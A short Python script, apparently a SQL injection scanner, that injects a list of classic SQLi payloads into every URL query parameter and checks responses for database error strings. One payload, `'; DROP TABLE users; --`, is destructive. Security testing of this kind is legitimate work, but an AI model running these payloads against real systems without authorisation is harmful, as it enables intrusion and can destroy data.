import requests
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse

# Common SQLi test payloads
SQLI_PAYLOADS = [
    "' OR '1'='1",
    "\" OR \"1\"=\"1",
    "' OR 1=1--",
    "'; DROP TABLE users; --",
    "' OR 'a'='a",
    "' OR 1=1 LIMIT 1--",
]

# SQL error fingerprints
SQL_ERRORS = [
    "you have an error in your sql syntax;",
    "warning: mysql",
    "unclosed quotation mark after the character string",
    "quoted string not properly terminated",
    "sql error",
    "mysql_fetch",
    "ODBC SQL Server Driver"
]

def is_suspected_sql_error(content):
    content_lower = content.lower()
    return any(error in content_lower for error in SQL_ERRORS)

def scan_sql_injection(url):
    print("\n🛑 SQL Injection Scan:")

    parsed = urlparse(url)
    query = parse_qs(parsed.query)

    if not query:
        print("[!] No parameters found to test.")
        return

    for param in query:
        original = query[param][0]
        for payload in SQLI_PAYLOADS:
            # Inject SQLi payload into parameter
            test_query = query.copy()
            test_query[param] = original + payload
            encoded_query = urlencode(test_query, doseq=True)

            test_url = urlunparse((parsed.scheme, parsed.netloc, parsed.path, parsed.params, encoded_query, parsed.fragment))
            print(f"[*] Testing: {test_url}")

            try:
                res = requests.get(test_url, timeout=10)
                if is_suspected_sql_error(res.text):
                    print(f"[❗] SQLi possible in parameter '{param}' with payload: {payload}")
                    break
            except Exception as e:
                print(f"[!] Request error: {e}")
